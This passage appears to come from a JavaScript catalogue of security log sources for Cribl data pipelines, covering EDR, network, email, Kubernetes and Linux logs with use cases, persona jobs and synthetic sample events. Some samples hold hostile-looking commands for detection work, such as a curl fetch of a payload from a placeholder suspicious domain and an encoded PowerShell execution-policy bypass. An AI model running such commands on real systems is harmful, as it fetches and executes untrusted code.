            { persona: 'Data Engineer', job: 'Route detection alerts and high-fidelity process events to SIEM while sending raw FDR telemetry to Lake for retrospective threat hunting' },
            { persona: 'Team Leader', job: 'Demonstrate FDR optimization ROI with per-event-type volume analysis showing detection coverage maintained at 60%+ cost reduction' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Monitor Falcon sensor coverage and identify endpoints with stale check-ins exceeding 72 hours across 10K+ managed devices' },
            { persona: 'Data Onboarder', job: 'Deploy FDR S3 collection with event type filtering and schema mapping to unified endpoint detection schema within 1 hour' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Track software inventory and agent version distribution to identify endpoints requiring updates or with degraded sensor functionality' },
            { persona: 'Data End User / Analyst', job: 'Monitor endpoint health telemetry to detect sensor tampering attempts and resource exhaustion impacting detection capability' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Falcon Data Replicator (FDR via S3) / Streaming API (HTTP) / SIEM Connector',
        sampleEvent: '{"event_simpleName":"ProcessRollup2","timestamp":"1717680000123","aid":"abcdef1234567890abcdef1234567890","ComputerName":"WORKSTATION-01","ImageFileName":"\\\\Device\\\\HarddiskVolume3\\\\Windows\\\\System32\\\\cmd.exe","CommandLine":"cmd.exe /c whoami","ParentBaseFileName":"explorer.exe","UserName":"CORP\\\\jperks","SHA256HashData":"b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874714"}'
      },
      {
        id: 'trellix-hx',
        name: 'Trellix HX (FireEye Endpoint)',
        vendor: 'Trellix (formerly FireEye/Mandiant)',
        description: 'Endpoint detection and response events from Trellix HX (formerly FireEye Endpoint Security). Captures IOC matches, exploit detection, malware execution blocks, real-time indicator matching, containment actions, process timeline data, and acquisition results. Includes alerts from the HX appliance/cloud, triage collections, and enterprise search results.',
        status: 'available',
        useCases: ['IOC Matching', 'Exploit Detection', 'Malware Execution Blocking', 'Endpoint Containment', 'Real-Time Indicator Sweeps', 'Triage Data Collection', 'Threat Intelligence Correlation', 'Lateral Movement Detection', 'Incident Response Automation'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Threat Hunting', 'DFIR', 'Endpoint Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for IOC matches, exploit detections, and malware execution blocks with automatic MITRE ATT&CK technique correlation' },
            { persona: 'Data End User / Analyst', job: 'Investigate endpoint containment events by correlating HX alerts with process timeline data and acquisition results for root cause analysis' },
            { persona: 'Jack of All Trades', job: 'Detect lateral movement by identifying exploit detections on multiple hosts from the same indicator within 15-minute correlation windows' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter informational IOC sweep results with zero matches and routine agent heartbeats, reducing HX log volume by 45-60% for SIEM' },
            { persona: 'Data Engineer', job: 'Route confirmed exploit detections and malware alerts to SIEM while sending IOC sweep results and triage data to Lake for hunting' },
            { persona: 'Team Leader', job: 'Quantify Trellix HX log optimization savings by comparing alert-only vs full telemetry ingestion costs across endpoint fleet' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor HX agent deployment health and containment status across endpoint fleet to ensure 99%+ coverage with no stale agents beyond 48 hours' },
            { persona: 'Data End User / Analyst', job: 'Track IOC indicator match rates and false positive ratios to optimize threat intelligence feed quality and reduce alert fatigue by 40%' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Trellix HX API collection via REST Collector with alert polling and pagination handling within 30 minutes' },
            { persona: 'Data Engineer', job: 'Normalize Trellix HX alerts into unified endpoint detection schema for cross-EDR correlation with CrowdStrike and Carbon Black events' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Trellix HX API (Cribl REST Collector) / Syslog (CEF) / STIX/TAXII feed / Trellix ePO integration',
        logFormat: 'JSON (API) or CEF (syslog). Alert types: malware-object, exploit-detection, ioc-match, containment, acquisition-completed. Key fields: alert_id, host.hostname, host.ip, indicator.name, indicator.category, matched_source_alerts, resolution.',
        avgEPS: '500-10,000 EPS depending on endpoint fleet and IOC feed size',
        sampleEvent: '{"alert":{"_id":"alert-12345","event_type":"exploit-detection","host":{"hostname":"WORKSTATION-01","ip":"10.1.2.100","os":"Windows 10","agent_version":"35.31.0","containment_state":"normal"},"indicator":{"name":"PROCESS INJECTION - CreateRemoteThread","category":"exploit","severity":"high"},"matched_at":"2026-06-06T14:32:08.000Z","source":"IOC","process_path":"C:\\\\Windows\\\\System32\\\\rundll32.exe","process_id":4521,"parent_process_path":"C:\\\\Windows\\\\explorer.exe","md5":"a1b2c3d4e5f6","resolution":"ALERT","event_values":{"processEvent/process":"rundll32.exe","processEvent/parentProcess":"explorer.exe","processEvent/username":"CORP\\\\jsmith"}}}'
      },
      {
        id: 'trellix-nx',
        name: 'Trellix NX (FireEye Network Security)',
        vendor: 'Trellix (formerly FireEye/Mandiant)',
        description: 'Network security detection events from Trellix NX (formerly FireEye Network Security). Captures multi-vector virtual execution (MVX) analysis results, IPS alerts, lateral movement detections, malware callbacks, zero-day exploit detections, and file analysis verdicts. Provides full packet capture references and MITRE ATT&CK mappings for confirmed threats.',
        status: 'available',
        useCases: ['Zero-Day Exploit Detection', 'Malware C2 Callback Detection', 'Lateral Movement Detection', 'Phishing Payload Analysis', 'Drive-By Download Blocking', 'Encrypted Traffic Anomalies', 'Data Exfiltration Detection', 'Network Forensics', 'IOC Extraction'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Threat Hunting', 'Network Security', 'DFIR'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for zero-day exploits, malware C2 callbacks, drive-by downloads, and encrypted traffic anomalies with MVX verdict correlation' },
            { persona: 'Data End User / Analyst', job: 'Investigate malware callback alerts by correlating NX network detections with endpoint process execution and DNS query patterns' },
            { persona: 'Jack of All Trades', job: 'Detect phishing payload delivery by tracing email attachment verdicts through MVX analysis to identify patient-zero infections within 5 minutes' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter IPS informational events and benign file analysis results, reducing NX alert volume by 50-70% while preserving all confirmed threats' },
            { persona: 'Data Engineer', job: 'Route MVX-confirmed malware alerts and C2 detections to SIEM while sending full IPS telemetry and pcap references to Lake for forensics' },
            { persona: 'Team Leader', job: 'Present NX alert optimization metrics showing SIEM cost reduction with zero impact on mean-time-to-detect for confirmed network threats' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor NX appliance health including MVX engine queue depth and analysis throughput to ensure zero detection gaps during traffic spikes' },
            { persona: 'Data End User / Analyst', job: 'Track detection efficacy metrics by alert type showing true positive rates and IOC extraction success for threat intelligence enrichment' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Trellix NX API collection via REST Collector with alert severity filtering and PCAP reference linking within 30 minutes' },
            { persona: 'Data Engineer', job: 'Normalize Trellix NX network alerts into unified threat detection schema for cross-platform correlation with endpoint and email security events' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Trellix NX API (Cribl REST Collector) / Syslog (CEF) / SMTP notifications / STIX/TAXII export',
        logFormat: 'JSON (API) or CEF (syslog). Alert types: malware-object, malware-callback, domain-match, infection-match, web-infection. Key fields: alert.id, alert.severity, src.ip, dst.ip, malware.name, explanation.cncServices, explanation.osChanges.',
        avgEPS: '100-5,000 EPS depending on network throughput and threat activity',
        sampleEvent: '{"alert":{"id":"nx-alert-67890","name":"Malware.Binary.exe","severity":"MAJR","occurred":"2026-06-06T14:32:08Z","src":{"ip":"10.1.2.100","port":49152,"host":"WORKSTATION-01","mac":"00:1a:2b:3c:4d:5e"},"dst":{"ip":"203.0.113.99","port":443,"host":"malicious-c2-server.xyz"},"malware":{"name":"Trojan.GenericKD.46789","md5":"deadbeef12345678","sha256":"a1b2c3d4e5f67890"},"explanation":{"malwareDetected":{"malware":[{"name":"Trojan.GenericKD.46789","sha256":"a1b2c3d4e5f67890"}]},"cncServices":{"cncService":[{"address":"203.0.113.99","port":"443","protocol":"ssl"}]},"osChanges":[{"type":"file_created","path":"C:\\\\Users\\\\Public\\\\payload.exe"}]},"action":"notified","vlan":100,"interface":"monitor1"}}'
      },
      {
        id: 'carbon-black',
        name: 'VMware Carbon Black EDR / Cloud',
        vendor: 'Broadcom (VMware)',
        description: 'Endpoint detection and response telemetry from VMware Carbon Black (CB EDR and CB Cloud). Captures process execution events, network connections, file modifications, registry changes, cross-process events, binary metadata, watchlist hits, and threat intelligence matches. CB Cloud provides cloud-native endpoint standard and enterprise sensor data via the Platform API and Data Forwarder (S3/Event Hub).',
        status: 'available',
        useCases: ['Process Execution Monitoring', 'Lateral Movement Detection', 'Ransomware Prevention', 'Living-off-the-Land Detection', 'Threat Intelligence Matching', 'Binary Analysis', 'Behavioral Indicators', 'Device Control', 'Vulnerability Assessment', 'Incident Response'],
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response', 'Endpoint Team', 'DFIR'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules for process injection, ransomware file modification patterns, and LOLBin execution chains with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Hunt for lateral movement by correlating cross-process events with network connections to identify credential reuse across 50+ endpoints within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect ransomware early by identifying mass file rename/encryption patterns exceeding 100 file modifications per minute from a single process tree' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume binary metadata and module load events, reducing Carbon Black telemetry by 55-70% for SIEM while preserving process execution and alert data' },
            { persona: 'Data Engineer', job: 'Route watchlist hits and threat alerts to SIEM in real time while sending full process/network telemetry to Lake for retrospective threat hunting' },
            { persona: 'Team Leader', job: 'Present per-event-type volume analysis demonstrating 60%+ EDR cost reduction with zero degradation in detection coverage metrics' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Carbon Black sensor health and identify endpoints with stale check-ins exceeding 48 hours across the managed fleet' },
            { persona: 'Data End User / Analyst', job: 'Track process execution baselines per endpoint role to detect behavioral anomalies indicating compromised hosts or unauthorized software' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure CB Cloud Data Forwarder S3 collection with event type filtering and deliver parsed events to SIEM + Lake within 45 minutes' },
            { persona: 'Data Engineer', job: 'Normalize Carbon Black process events into unified endpoint schema for cross-EDR correlation with CrowdStrike and Trellix HX telemetry' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'CB Cloud Data Forwarder (S3/Azure Event Hub) / CB EDR Event Forwarder (Syslog/JSON) / Platform API (Cribl REST Collector) / SIEM Connector',
        logFormat: 'JSON (Data Forwarder and API). Event types: endpoint.event.procstart, endpoint.event.netconn, endpoint.event.filemod, endpoint.event.regmod, endpoint.event.crossproc, endpoint.event.modload, alert. Key fields: process_name, process_hash, process_cmdline, parent_name, parent_hash, device_name, device_os, event_type, alert_severity.',
        avgEPS: '5,000-100,000 EPS depending on endpoint fleet size and sensor verbosity',
        sampleEvent: '{"type":"endpoint.event.procstart","event_timestamp":"2026-06-09T14:32:08.000Z","device_id":"12345678","device_name":"WORKSTATION-01","device_os":"WINDOWS","device_os_version":"Windows 10 x64","org_key":"ABCD1234","process_guid":"ABCD1234-0000abcd-00001234-00000000-1d8a0b0c0d0e0f00","process_name":"cmd.exe","process_hash":["b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874714"],"process_cmdline":"cmd.exe /c powershell -ep bypass -enc SQBFAFgA...","process_username":"CORP\\\\jsmith","process_pid":4521,"parent_guid":"ABCD1234-0000abcd-00001230-00000000-1d8a0b0c0d0e0f00","parent_name":"explorer.exe","parent_hash":["a1b2c3d4e5f67890"],"parent_pid":2100,"childproc_type":"CHILD","crossproc_type":"","alert_id":[],"ttp":["MITRE_T1059.001"]}'
      }
    ]
  },
  {
    category: 'Email Security',
    icon: '📧',
    sources: [
      {
        id: 'cisco-secure-email',
        name: 'Cisco Secure Email Gateway (IronPort)',
        vendor: 'Cisco',
        description: 'Email security event logs from Cisco Secure Email Gateway (formerly IronPort/ESA). Captures message tracking events, anti-spam verdicts (IPAS/CASE), antivirus results, Advanced Malware Protection (AMP) file analysis, DLP policy matches, content filter actions, sender reputation scores (SenderBase/Talos), DKIM/SPF/DMARC authentication results, and URL filtering verdicts from outbreak filters.',
        status: 'available',
        useCases: ['Phishing Detection', 'Business Email Compromise', 'Malware Delivery Blocking', 'Data Loss Prevention', 'Spam Volume Monitoring', 'Sender Reputation Analysis', 'URL Rewriting Effectiveness', 'Outbreak Filter Performance', 'Quarantine Management', 'Email Authentication Failures'],
        personas: ['SOC', 'Security Engineering', 'Email Administration', 'Compliance', 'Incident Response', 'Data Protection'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for phishing campaigns, BEC impersonation patterns, and weaponized attachment delivery with sender reputation correlation' },
            { persona: 'Data End User / Analyst', job: 'Investigate Business Email Compromise by correlating DMARC/SPF failures with sender domain age and impersonation scoring to identify active campaigns within 10 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect targeted phishing by identifying emails bypassing outbreak filters with suspicious attachment hashes or URL rewrites from low-reputation senders' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress clean delivery confirmations and routine spam rejections, reducing Cisco Secure Email log volume by 50-65% while preserving all threat verdicts' },
            { persona: 'Data Engineer', job: 'Route AMP malicious verdicts, DLP matches, and phishing detections to SIEM while batching full message tracking logs to Lake for forensic search' },
            { persona: 'Team Leader', job: 'Demonstrate email security log optimization ROI with per-verdict-type volume breakdown and maintained detection SLA for phishing and BEC alerts' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete email DLP audit trail with attachment metadata for 13+ months to satisfy regulatory data handling requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate DLP policy violation reports showing sensitive content matches by sender, recipient domain, and content filter action within 15 minutes' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor email delivery health including queue depth, deferred message rates, and anti-spam engine performance to detect gateway degradation within 3 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track sender reputation score trends and outbreak filter activation frequency to measure email security effectiveness and tune policies' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (TCP/TLS from ESA/CES) / Cisco SMA centralized tracking / API (AsyncOS REST) / Consolidated Event Logs (CEL)',
        logFormat: 'Structured syslog with multiple log types: mail_logs (message tracking), amp (AMP verdicts), authentication (SPF/DKIM/DMARC), content_filter, anti_spam, antivirus, dlp. Key fields: MID, ICID, DCID, from, to, subject, action, verdict, score, attachment_name.',
        avgEPS: '2,000-50,000 EPS depending on email volume and filter verbosity',
        sampleEvent: 'Jun  6 14:32:08 esa01.corp.example.com mail_logs: Info: MID 12345678 ICID 87654321 From: <attacker@suspicious-domain.xyz> To: <jperks@cribl.io> Subject: "Urgent: Invoice Payment Required" Action: quarantined Reason: outbreak-filter Verdict: spam Score: 98 SPF: fail DKIM: none DMARC: fail Attachment: invoice_june.pdf.exe AMP: malicious SHA256: a1b2c3d4e5f67890 ThreatName: W32.Phishing.Trojan Reputation: -8.5 SenderGroup: BLOCKLIST'
      }
    ]
  },
  {
    category: 'Kubernetes',
    icon: '⎈',
    sources: [
      {
        id: 'k8s-audit-logs',
        name: 'Kubernetes Audit Logs',
        vendor: 'CNCF',
        description: 'Kubernetes API server audit logs (audit.k8s.io/v1) capturing all requests to the control plane including resource CRUD, authentication decisions, RBAC evaluations, pod exec/portforward, and admission controller results. Events include actor identity, source IPs, target resource, request/response bodies, and authorization annotations.',
        status: 'available',
        useCases: ['Privilege Escalation', 'Secret Access Monitoring', 'Container Exec Detection', 'Suspicious API Access', 'RBAC Change Tracking', 'Deployment Failures', 'Control Plane Errors', 'Platform Change Tracking', 'Node Health Monitoring', 'Resource Quota Enforcement'],
        personas: ['Security Engineering', 'Platform Engineering', 'SRE', 'DevOps', 'Cloud Security', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for container exec into production pods, RBAC privilege escalation, secret access from unauthorized service accounts, and admission controller bypasses' },
            { persona: 'Data End User / Analyst', job: 'Investigate suspicious kubectl exec sessions by correlating API server audit events with source IPs, user identity, and RBAC role bindings within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect privilege escalation by identifying ClusterRoleBinding modifications granting cluster-admin to non-platform service accounts' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor deployment failures and pod eviction rates across 50+ namespaces to detect resource quota exhaustion and scheduling issues within 2 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track API server request latency and error rates by verb and resource to identify control plane degradation before workload impact' },
            { persona: 'Platform Administrator', job: 'Audit all resource modifications across clusters to maintain change management compliance and detect unauthorized infrastructure drift' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete Kubernetes API audit trail for 13+ months with user attribution to satisfy SOC2 infrastructure access control requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate RBAC compliance reports showing over-permissioned service accounts and ClusterRole bindings violating least-privilege policies' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume GET/LIST/WATCH audit events for health checks and controller reconciliation loops, reducing K8s audit volume by 65-80% for SIEM' },
            { persona: 'Data Engineer', job: 'Route create/delete/exec operations and RBAC changes to SIEM while sending full audit trail to Lake for forensic investigation' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Datadog', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Webhook Backend (HTTP/S to Cribl) / File Monitor (Cribl Edge on audit.log) / CloudWatch Logs (EKS) / Pub/Sub (GKE) / Event Hub (AKS)',
        sampleEvent: '{"apiVersion":"audit.k8s.io/v1","kind":"Event","level":"Metadata","auditID":"7e3c4a2b-1f8d-4e5c-9a6b-3d2c1e0f8a7b","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/production/pods/data-processor-7b4f8c6d9-xk2mz/exec?command=sh&stdin=true&stdout=true&tty=true","verb":"create","user":{"username":"jordan.perks@cribl.io","groups":["engineering","system:authenticated"]},"sourceIPs":["10.128.0.45"],"userAgent":"kubectl/v1.29.2 (linux/amd64)","objectRef":{"resource":"pods","namespace":"production","name":"data-processor-7b4f8c6d9-xk2mz","apiVersion":"v1","subresource":"exec"},"responseStatus":{"code":101,"status":"Success"},"requestReceivedTimestamp":"2026-06-06T14:22:01.234567Z","stageTimestamp":"2026-06-06T14:22:01.298432Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":"RBAC: allowed by ClusterRoleBinding \\"engineering-deploy\\" of ClusterRole \\"deploy-manager\\" to Group \\"engineering\\""}}'
      }
    ]
  },
  {
    category: 'Operating System',
    icon: '🐧',
    sources: [
      {
        id: 'linux-auditd',
        name: 'Linux Auditd Logs',
        vendor: 'Linux Kernel',
        description: 'Kernel-level audit logs from the Linux Audit Framework (auditd). Captures syscall-level process execution (execve), file access (open/read/write/unlink), network connections (connect/accept/bind), user authentication, privilege escalation (setuid/setgid), kernel module loading, and security policy decisions. Events use key=value pair format grouped by audit ID.',
        status: 'available',
        useCases: ['Process Execution Monitoring', 'File Integrity Monitoring', 'Privilege Escalation Detection', 'Unauthorized Access Attempts', 'Kernel Module Tampering', 'Data Exfiltration Detection', 'Compliance Auditing (PCI/HIPAA/SOX)', 'Insider Threat Detection', 'Container Escape Detection'],
        personas: ['Security Engineering', 'SOC', 'Compliance', 'Incident Response', 'Threat Hunting', 'Platform Engineering'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for unauthorized file access, suspicious process execution (execve), privilege escalation via setuid, and kernel module loading with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Hunt for insider threats by correlating file access patterns with user identity and session context to detect unauthorized data access within 10 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect container escape attempts by identifying unexpected syscalls (mount, ptrace, unshare) from containerized processes targeting host namespaces' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain immutable file integrity audit trail with syscall-level evidence for 13+ months to satisfy PCI-DSS Section 10 and HIPAA access logging requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate compliance reports showing file access to sensitive paths (/etc/shadow, /etc/passwd, certificate stores) with user attribution and timestamps' },
            { persona: 'Team Leader', job: 'Demonstrate audit coverage completeness showing 100% of critical system calls monitored across production Linux fleet with zero gaps' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume syscall noise (routine stat/open calls from monitoring agents) reducing auditd volume by 60-75% while preserving security-relevant events' },
            { persona: 'Data Engineer', job: 'Route execve, file modification, and privilege escalation events to SIEM while sending full syscall audit to Lake for forensic investigation' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge file monitor on /var/log/audit/audit.log with multi-line event reassembly and deliver parsed events within 20 minutes per host' },
            { persona: 'Data Engineer', job: 'Parse auditd key=value format into structured fields and correlate multi-record audit events by audit ID for complete execution context' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on /var/log/audit/audit.log) / audisp-remote plugin (syslog forwarding) / auditd log shipping via rsyslog',
        sampleEvent: 'type=SYSCALL msg=audit(1717680001.234:28764): arch=c000003e syscall=59 success=yes exit=0 a0=55b3a1c2e340 a1=55b3a1c2e3a0 a2=55b3a1c2e3b0 a3=7ffd4a2b1c80 items=2 ppid=4521 pid=4522 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="curl" exe="/usr/bin/curl" subj=unconfined_u:unconfined_r:unconfined_t:s0 key="exec_monitor"\ntype=EXECVE msg=audit(1717680001.234:28764): argc=3 a0="curl" a1="-s" a2="http://suspicious-domain.xyz/payload"\ntype=PATH msg=audit(1717680001.234:28764): item=0 name="/usr/bin/curl" inode=1048721 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL'
      },
      {
        id: 'linux-auth',
        name: 'Linux Auth / Secure Logs',
        vendor: 'Linux (PAM/SSH/sudo)',
        description: 'Authentication and authorization logs from /var/log/secure (RHEL/CentOS) or /var/log/auth.log (Debian/Ubuntu). Captures SSH authentication success/failure, sudo command execution, su user switching, PAM session events, account creation/modification, password changes, and systemd-logind session tracking.',
        status: 'available',
        useCases: ['SSH Brute Force Detection', 'Unauthorized Sudo Usage', 'Privilege Escalation', 'Account Compromise', 'Credential Stuffing', 'Lateral Movement via SSH', 'Insider Threat Monitoring', 'Compliance Access Auditing', 'Service Account Abuse'],
        personas: ['Security Engineering', 'SOC', 'Compliance', 'Incident Response', 'Platform Engineering', 'SRE'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for SSH brute force (10+ failures in 60s), sudo abuse to unauthorized commands, and credential compromise via password spray patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate lateral movement by correlating successful SSH authentications with source IP reputation and impossible travel between Linux hosts within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect credential compromise by identifying successful logins from new IPs immediately following brute force sequences against the same account' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete privileged access audit trail capturing all sudo commands and su session switches for 13+ months to satisfy SOC2 access control requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate privileged access reports showing sudo usage by user, command, and host with exception flagging for non-standard privilege escalation paths' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate repetitive PAM session open/close events and CRON authentication entries, reducing auth log volume by 45-60% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route authentication failures, sudo commands, and account modifications to SIEM while sending successful SSH sessions to Lake for baseline analysis' },
            { persona: 'Team Leader', job: 'Quantify auth log optimization savings per-host showing detection coverage maintained with 50%+ volume reduction across 500+ Linux servers' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor SSH service availability and PAM module errors across Linux fleet to detect authentication infrastructure issues within 2 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track account lockout patterns and password change frequency to identify service accounts with credential rotation failures' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on /var/log/secure or /var/log/auth.log) / rsyslog TCP/TLS forwarding / journald export',
        sampleEvent: 'Jun  6 14:32:08 prod-web-01 sshd[24601]: Accepted publickey for jperks from 10.0.1.42 port 52341 ssh2: RSA SHA256:abc123def456\nJun  6 14:32:15 prod-web-01 sudo: jperks : TTY=pts/0 ; PWD=/home/jperks ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx\nJun  6 14:33:01 prod-web-01 sshd[24890]: Failed password for invalid user admin from 203.0.113.99 port 44521 ssh2'
      },
      {
        id: 'linux-syslog',
        name: 'Linux System Logs (syslog/journald)',
        vendor: 'Linux (systemd/kernel)',
        description: 'System-level logs from syslog (/var/log/messages, /var/log/syslog) and journald covering kernel messages, systemd unit lifecycle events, OOM kills, hardware errors, disk I/O failures, network interface changes, SELinux/AppArmor denials, service crashes, and resource exhaustion events.',
        status: 'available',
        useCases: ['OOM Kill Detection', 'Service Crash Monitoring', 'Disk Failure Detection', 'Network Interface Monitoring', 'SELinux Denial Tracking', 'Resource Exhaustion Alerting', 'Package Change Tracking', 'Boot/Shutdown Analysis', 'Hardware Error Detection'],
        personas: ['SRE', 'Platform Engineering', 'NOC', 'Security Engineering', 'DevOps'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Detect OOM kills and service crashes within 60 seconds by correlating kernel messages with systemd unit failure events across 500+ hosts' },
            { persona: 'Data End User / Analyst', job: 'Track disk I/O error trends (EXT4 errors, SCSI timeouts) per host to predict storage failures 24-48 hours before data loss' },
            { persona: 'Jack of All Trades', job: 'Identify resource exhaustion cascades by correlating OOM events with service restart patterns and CPU/memory threshold breaches' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for SELinux/AppArmor denial spikes indicating exploitation attempts, unauthorized kernel module loads, and suspicious network interface changes' },
            { persona: 'Data End User / Analyst', job: 'Investigate security-relevant syslog events by correlating SELinux denials with process context to identify policy bypass attempts within 10 minutes' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress repetitive systemd status messages and periodic health check outputs, reducing syslog volume by 50-70% while preserving error and warning events' },
            { persona: 'Data Engineer', job: 'Route kernel errors, OOM kills, and service failures to SIEM/monitoring while sending full syslog to Lake for root cause analysis and capacity planning' },
            { persona: 'Team Leader', job: 'Present syslog optimization metrics showing per-facility volume reduction with maintained alerting coverage for critical infrastructure events' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Scale syslog collection across 1000+ Linux hosts with centralized Edge fleet management and automatic log rotation handling' },
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge file monitor on /var/log/messages with facility-based routing to multiple destinations within 15 minutes per host group' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on /var/log/messages or /var/log/syslog) / rsyslog TCP/TLS / journald-upload / systemd-journal-remote',
